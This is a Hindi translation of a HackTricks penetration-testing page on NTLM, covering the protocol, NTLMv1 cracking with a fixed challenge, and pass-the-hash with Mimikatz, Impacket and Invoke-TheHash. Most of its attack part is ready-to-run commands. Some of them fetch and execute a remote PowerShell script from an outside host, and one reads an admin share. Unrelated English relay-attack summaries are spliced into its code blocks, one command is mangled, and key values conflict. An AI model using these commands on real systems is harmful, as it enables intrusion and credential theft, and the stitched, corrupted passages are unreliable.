# NTLM

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी **कंपनी का विज्ञापन HackTricks में देखना चाहते हैं**? या क्या आप **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करना चाहते हैं**? [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) की जाँच करें!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह।
* [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com) प्राप्त करें।
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या मुझे **Twitter** पर **🐦**[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **हैकिंग ट्रिक्स साझा करें, PRs सबमिट करके** [**hacktricks रेपो**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud रेपो**](https://github.com/carlospolop/hacktricks-cloud) **को**।

</details>

## मूल जानकारी

**NTLM Credentials**: डोमेन नाम (यदि कोई है), उपयोगकर्ता नाम और पासवर्ड हैश।

**LM** केवल **Windows XP और सर्वर 2003** में **सक्षम** है (LM हैश को क्रैक किया जा सकता है)। LM हैश AAD3B435B51404EEAAD3B435B51404EE का मतलब है कि LM का उपयोग नहीं हो रहा है (खाली स्ट्रिंग का LM हैश है)।

डिफ़ॉल्ट रूप से **Kerberos** का उपयोग होता है, इसलिए NTLM का उपयोग केवल तब होगा जब **कोई Active Directory कॉन्फ़िगर नहीं है**, **डोमेन मौजूद नहीं है**, **Kerberos काम नहीं कर रहा है** (बुरी कॉन्फ़िगरेशन) या **वालिड होस्ट-नाम की बजाय IP का उपयोग करने वाला क्लाइंट** कोनेक्ट करने की कोशिश करता है।

**NTLM प्रमाणीकरण** के **नेटवर्क पैकेट** के **हेडर** में "**NTLMSSP**" होता है।

प्रोटोकॉल: LM, NTLMv1 और NTLMv2 को DLL %windir%\Windows\System32\msv1\_0.dll में समर्थित किया गया है।

## LM, NTLMv1 और NTLMv2

आप जांच और कॉन्फ़िगर कर सकते हैं कि कौन सा प्रोटोकॉल उपयोग किया जाएगा:

### GUI

_secpol.msc_ चलाएं -> स्थानीय नीतियाँ -> सुरक्षा विकल्प -> नेटवर्क सुरक्षा: LAN प्रबंधन प्रमाणीकरण स्तर। 6 स्तर हैं (0 से 5 तक)।

![](<../../.gitbook/assets/image (92).png>)

### रजिस्ट्री

यह स्तर 5 सेट करेगा:
```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```
संभावित मान:
```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```
## बेसिक NTLM डोमेन प्रमाणीकरण योजना

1. **उपयोगकर्ता** अपने **प्रमाणपत्र** प्रस्तुत करता है
2. क्लाइंट मशीन **प्रमाणीकरण अनुरोध भेजती है** जिसमें **डोमेन नाम** और **उपयोगकर्ता नाम** भेजती है
3. **सर्वर** **चुनौती** भेजता है
4. **क्लाइंट** चुनौती को **पासवर्ड के हैश का उपयोग करके एन्क्रिप्ट** करता है और इसे प्रतिक्रिया के रूप में भेजता है
5. **सर्वर** **डोमेन कंट्रोलर** को **डोमेन नाम, उपयोगकर्ता नाम, चुनौती और प्रतिक्रिया** भेजता है। यदि **सक्रिय निर्देशिका** कॉन्फ़िगर नहीं है या डोमेन नाम सर्वर का नाम है, तो प्रमाणपत्र **स्थानीय रूप से जांची जाती है**।
6. **डोमेन कंट्रोलर** जांचता है कि सब कुछ सही है और सर्वर को जानकारी भेजता है

**सर्वर** और **डोमेन कंट्रोलर** को **नेटलॉगन** सर्वर के माध्यम से **सुरक्षित चैनल** बनाने में सक्षम होते हैं क्योंकि डोमेन कंट्रोलर सर्वर के पासवर्ड को जानता है (यह **NTDS.DIT** डेटाबेस में है)।

### स्थानीय NTLM प्रमाणीकरण योजना

प्रमाणीकरण उसी तरह है जैसा **पहले उल्लिखित** है, लेकिन **सर्वर** उस **उपयोगकर्ता के हैश को जानता है** जो **SAM** फ़ाइल में प्रमाणीकरण करने की कोशिश कर रहा है। इसलिए, डोमेन कंट्रोलर से पूछने की बजाय, **सर्वर खुद जांचेगा** कि क्या उपयोगकर्ता प्रमाणीकरण कर सकता है।

### NTLMv1 चुनौती

**चुनौती लंबाई 8 बाइट** है और **प्रतिक्रिया 24 बाइट** लंबी है।

**हैश NT (16 बाइट)** को **3 हिस्सों में विभाजित किया जाता है (प्रत्येक 7 बाइट)**: **आखिरी हिस्सा शून्यों से भरा होता है**। फिर, **चुनौती** को प्रत्येक हिस्से के साथ अलग-अलग **एन्क्रिप्ट** किया जाता है और परिणामी एन्क्रिप्टेड बाइट्स **जोड़े जाते हैं**। कुल: 8 बाइट + 8 बाइट + 8 बाइट = 24 बाइट।

**समस्याएं**:

* **अनियमितता की कमी**
* 3 हिस्से अलग-अलग **हमले किए जा सकते हैं** ताकि NT हैश पता लगाया जा सके
* **DES को तोड़ा जा सकता है**
* 3 वां कुंजी हमेशा **5 शून्यों** से मिलकर बनाई जाती है।
* **एक ही चुनौती** दिया जाएगा तो **प्रतिक्रिया** **समान** होगी। इसलिए, आप पीड़ित को **पूर्व-गणना रेनबो तालिकाओं** का उपयोग करके प्रतिक्रिया के लिए "**1122334455667788**" स्ट्रिंग को चुनौती दे सकते हैं और हमला कर सकते हैं।

### NTLMv1 हमला

आजकल अनकंशित डेलीगेशन कॉन्फ़िगर किए गए परिवेशों को ढूंढना कम हो रहा है, लेकिन यह यह नहीं मतलब है कि आप **प्रिंट स्पूलर सेवा** का दुरुपयोग नहीं कर सकते।

आप AD पर पहले से कुछ प्रमाणपत्र/सत्रों का दुरुपयोग करके **प्रिंटर से अनुरोध कर सकते हैं** कि वह आपके नियंत्रण के तहत किसी **होस्ट के खिलाफ प्रमाणीकरण** करें। फिर, `metasploit auxiliary/server/capture/smb` या `responder` का उपयोग करके आप **प्रमाणीकरण चुनौती को 1122334455667788** सेट कर सकते हैं, प्रमाणीकरण प्रयास को कैप्चर कर सकते हैं, और यदि यह **NTLMv1** के उपयोग से किया गया है तो आप इसे **तोड़ सकते हैं**।\
यदि आप `responder` का उपयोग कर रहे हैं तो आप \*\*ध्यान दें कि इस तकनीक के लिए प्रमाणीकरण को NTLMv1 का उपयोग करके किया जाना चाहिए (NTLMv2 मान्य नहीं है)।_

ध्यान रखें कि प्रिंटर प्रमाणीकरण के दौरान कंप्यूटर खाता का उपयोग करेगा, और कंप्यूटर खाते का उपयोग **लंबा और यादृच्छिक पासवर्ड** करते हैं जिसे आप **सामान्य शब्दकोश** का उपयोग करके **तोड़ने** के लिए **संभावना नहीं है**। लेकिन **NTLMv1** प्रमाणीकरण **DES का उपयोग करता है** ([अधिक जानकारी यहाँ](./#ntlmv1-challenge)), इसलिए कुछ विशेष रूप से DES को तोड़ने के लिए सेवाओं का उपयोग करके आप इसे तोड़ सकते हैं (आप [https://crack.sh/](https://crack.sh) का उपयोग कर सकते हैं)।

### hashcat के साथ NTLMv1 हमला

NTLMv1 को NTLMv1 मल्टी टूल [https://github.com/evilmog/ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi) के साथ तोड़ा जा सकता है जो NTLMv1 संदेशों को एक ऐसी विधि में स्वरूपित करता है जिसे hashcat के साथ तोड़ा जा सकता है।

आज्ञा
```
python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
```
## NTLM Relay Attack

### Introduction

In an NTLM relay attack, an attacker intercepts the NTLM authentication traffic between a client and a server, and relays it to another server to authenticate as the original client. This attack can be used to gain unauthorized access to systems and resources.

### Steps to Perform NTLM Relay Attack

1. **Set Up a Rogue Server**: The attacker sets up a rogue server to intercept NTLM authentication requests from the client.
   
2. **Capture NTLM Authentication Traffic**: The rogue server captures the NTLM authentication traffic between the client and the legitimate server.
   
3. **Relay the Authentication**: The attacker relays the captured authentication traffic to another server to authenticate as the client.
   
4. **Gain Unauthorized Access**: By successfully relaying the authentication, the attacker gains unauthorized access to the target system or resource.

### Mitigation Techniques

To prevent NTLM relay attacks, consider implementing the following mitigation techniques:

- **Enforce SMB Signing**: Enabling SMB signing can help prevent NTLM relay attacks by ensuring the integrity of the SMB packets.
  
- **Use Extended Protection for Authentication**: Implement Extended Protection for Authentication to protect against NTLM relay attacks.
  
- **Disable NTLM**: Consider disabling NTLM authentication in favor of more secure authentication protocols like Kerberos.

By implementing these mitigation techniques, organizations can reduce the risk of falling victim to NTLM relay attacks.
```
['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
```
# NTLM Relay Attack

## Introduction

NTLM relay attacks are a common technique used by attackers to escalate privileges in a Windows environment. This attack involves intercepting NTLM authentication traffic and relaying it to other systems to gain unauthorized access.

## How it works

1. The attacker intercepts NTLM authentication traffic between a client and a server.
2. The attacker relays this traffic to another system, such as a file server or domain controller.
3. The target system processes the authentication request, believing it is coming from the original client.
4. If successful, the attacker gains unauthorized access to the target system using the compromised credentials.

## Mitigation

To mitigate NTLM relay attacks, consider implementing the following measures:

- Disable NTLM authentication in favor of more secure protocols like Kerberos.
- Enable SMB signing to prevent tampering with authentication traffic.
- Implement network segmentation to limit the scope of potential relay attacks.
- Regularly monitor and analyze network traffic for suspicious activity.

By following these best practices, organizations can reduce the risk of falling victim to NTLM relay attacks.
```
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
```
अगर आपके पास हैशटोपोलिस जैसे टूल के माध्यम से वितरित हैशकैट को चलाएं, यह अन्यथा कई दिन ले सकता है।
```
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```
इस मामले में हमें इसका पासवर्ड पता है कि 'password' है, इसलिए हम डेमो के उद्देश्यों के लिए धोखा देंगे:
```
python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```
हमें अब hashcat-utilities का उपयोग करना होगा ताकि क्रैक किए गए des कुंजी को NTLM हैश के हिस्सों में बदला जा सके:
```
./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
b4b9b02e6f09a9 # this is part 1

./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
bd760f388b6700 # this is part 2
```
## NTLM

### Overview

NTLM (NT LAN Manager) is a suite of Microsoft security protocols that provides authentication, integrity, and confidentiality to users. It is commonly used for authentication in Windows environments.

### NTLM Relay Attack

NTLM relay attack is a type of attack where an attacker captures the NTLM authentication request sent by a victim and relays it to a target server to gain unauthorized access. This attack can be mitigated by implementing security measures such as SMB signing, Extended Protection for Authentication, and LDAP signing.

### Protection

To protect against NTLM relay attacks, it is recommended to disable NTLM authentication in favor of more secure protocols like Kerberos. Additionally, enabling SMB signing, Extended Protection for Authentication, and LDAP signing can help prevent these attacks.
```
./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

586c # this is the last part
```
## NTLM

### Overview

NTLM (NT LAN Manager) is a suite of Microsoft security protocols that provides authentication, integrity, and confidentiality to users. It is commonly used in Windows environments for authentication purposes.

### NTLM Hashes

NTLM hashes are generated by hashing the user's password. These hashes can be used in various hacking techniques, such as pass-the-hash attacks, to gain unauthorized access to systems.

### Protecting Against NTLM Attacks

To protect against NTLM attacks, it is recommended to use stronger authentication methods such as Kerberos, enable SMB signing, and disable the use of NTLM where possible. Additionally, regularly changing passwords and monitoring for any suspicious activity can help mitigate the risk of NTLM attacks.
```
NTHASH=b4b9b02e6f09a9bd760f388b6700586c
```
### NTLMv2 Challenge

**चुनौती की लंबाई 8 बाइट है** और **2 प्रतिक्रियाएँ भेजी जाती हैं**: एक **24 बाइट** लंबी है और **दूसरी** की लंबाई **विविध** है।

**पहली प्रतिक्रिया** को **HMAC\_MD5** का उपयोग करके बनाया जाता है, **client और domain** द्वारा गठित **स्ट्रिंग** को और **कुंजी** के रूप में **NT hash** के **हैश MD4** का उपयोग करके। फिर, **परिणाम** को **कुंजी** के रूप में उपयोग करके **HMAC\_MD5** का उपयोग करके **चुनौती** को गूंथने के लिए किया जाएगा। इसके लिए, **8 बाइट का एक client challenge जोड़ा जाएगा**। कुल: 24 B।

**दूसरी प्रतिक्रिया** को उपयोग करके बनाया जाता है **कई मान** (एक नया client challenge, **replay attacks** से बचने के लिए एक **टाइमस्टैम्प**...)

यदि आपके पास एक **pcap है जिसने एक सफल प्रमाणीकरण प्रक्रिया को कैप्चर किया है**, तो आप इस गाइड का पालन करके डोमेन, उपयोगकर्ता नाम, चुनौती और प्रतिक्रिया प्राप्त कर सकते हैं और पासवर्ड को तोड़ने का प्रयास कर सकते हैं: [https://research.801labs.org/cracking-an-ntlmv2-hash/](https://research.801labs.org/cracking-an-ntlmv2-hash/)

## Pass-the-Hash

**जब आपके पास पीड़ित का हैश होता है**, तो आप इसका उपयोग **अनुकरण** करने के लिए कर सकते हैं।\
आपको एक **उपकरण** का उपयोग करना होगा जो **उस हैश का उपयोग करके NTLM प्रमाणीकरण करेगा**, **या** आप एक नया **सत्रलॉगऑन** बना सकते हैं और उस हैश को **LSASS** में इंजेक्ट कर सकते हैं, ताकि जब भी कोई **NTLM प्रमाणीकरण किया जाता है**, तो उस हैश का उपयोग किया जाएगा। आखिरी विकल्प है जिसे mimikatz करता है।

**कृपया ध्यान दें कि आप कंप्यूटर खातों का उपयोग करके भी Pass-the-Hash हमले कर सकते हैं।**

### **Mimikatz**

**व्यवस्थापक के रूप में चलाने की आवश्यकता है**
```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
```
यह एक प्रक्रिया को शुरू करेगा जो उन उपयोगकर्ताओं के नाम पर होगी जिन्होंने मिमीकैट्ज लॉन्च किया है, लेकिन LSASS में सहेजे गए क्रेडेंशियल्स मिमीकैट्ज पैरामीटर्स के अंदर होंगे। फिर, आप नेटवर्क संसाधनों तक पहुंच सकते हैं जैसे कि आप उस उपयोगकर्ता हो (जैसे `runas /netonly` ट्रिक लेकिन आपको plain-text पासवर्ड को जानने की आवश्यकता नहीं है)।

### लिनक्स से पास-द-हैश

आप लिनक्स से पास-द-हैश का उपयोग करके Windows मशीनों में कोड निष्पादन प्राप्त कर सकते हैं।\
[**यहाँ पहुंचें और इसे कैसे करें जानें।**](../../windows/ntlm/broken-reference/)

### Impacket Windows कंपाइल किए गए उपकरण

आप यहाँ से [Windows के लिए Impacket बाइनरी डाउनलोड कर सकते हैं](https://github.com/ropnop/impacket\_static\_binaries/releases/tag/0.9.21-dev-binaries)।

* **psexec\_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
* **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
* **atexec.exe** (इस मामले में आपको एक कमांड निर्दिष्ट करने की आवश्यकता है, cmd.exe और powershell.exe एक इंटरैक्टिव शैली प्राप्त करने के लिए मान्य नहीं हैं) `C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
* और कई और Impacket बाइनरी हैं...

### Invoke-TheHash

आप यहाँ से पावरशेल स्क्रिप्ट प्राप्त कर सकते हैं: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)

#### Invoke-SMBExec
```
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### इन्वोक-डब्ल्यूएमआईइक्जेक्यूट
```
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### इनवोक-एसएमबीक्लाइंट
```
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```
#### इनवोक-एसएमबीईनुम
```
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```
#### Invoke-TheHash

यह फ़ंक्शन **सभी अन्य** का **मिश्रण** है। आप **कई होस्ट** पास कर सकते हैं, **किसी को छोड़ सकते** हैं और जिस **विकल्प** का उपयोग करना चाहते हैं उसे **चुन सकते** हैं (_SMBExec, WMIExec, SMBClient, SMBEnum_). अगर आप **SMBExec** और **WMIExec** में से **किसी भी** को चुनते हैं लेकिन आप **कोई** _**कमांड**_ पैरामीटर नहीं देते हैं तो यह **बस जांचेगा** कि क्या आपके पास **पर्याप्त अनुमतियाँ** हैं।
```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```
### [Evil-WinRM पास द हैश](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

### Windows Credentials Editor (WCE)

**इसे व्यवस्थापक के रूप में चलाया जाना चाहिए**

यह उपकरण mimikatz की तरही काम करेगा (LSASS मेमोरी को संशोधित करेगा)।
```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```
### मैनुअल Windows रिमोट निष्पादन उपयोगकर्ता नाम और पासवर्ड के साथ

{% content-ref url="../lateral-movement/" %}
[lateral-movement](../lateral-movement/)
{% endcontent-ref %}

## एक Windows होस्ट से क्रेडेंशियल्स निकालना

**अधिक जानकारी के लिए** [**एक Windows होस्ट से क्रेडेंशियल्स प्राप्त करने के बारे में आपको इस पृष्ठ को पढ़ना चाहिए**](broken-reference)**.**

## NTLM रिले और रिस्पॉन्डर

**इन हमलों को कैसे करने के बारे में अधिक विस्तृत गाइड के लिए यहाँ पढ़ें:**

{% content-ref url="../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md" %}
[spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
{% endcontent-ref %}

## नेटवर्क कैप्चर से NTLM चैलेंज पार्स करें

**आप** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide) **का उपयोग कर सकते हैं**

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी कंपनी को **हैकट्रिक्स में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS के नवीनतम संस्करण या हैकट्रिक्स को पीडीएफ में डाउनलोड करने का एक्सेस** चाहिए? [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**द पीएस फैमिली**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**एनएफटी**](https://opensea.io/collection/the-peass-family) संग्रह देखें
* [**आधिकारिक PEASS और हैकट्रिक्स स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या मुझे **ट्विटर पर फॉलो** करें **🐦**[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **हैकिंग ट्रिक्स साझा करें, PRs सबमिट करके** [**हैकट्रिक्स रेपो**](https://github.com/carlospolop/hacktricks) **और** [**हैकट्रिक्स-क्लाउड रेपो**](https://github.com/carlospolop/hacktricks-cloud) **को फॉलो** करें।

</details>
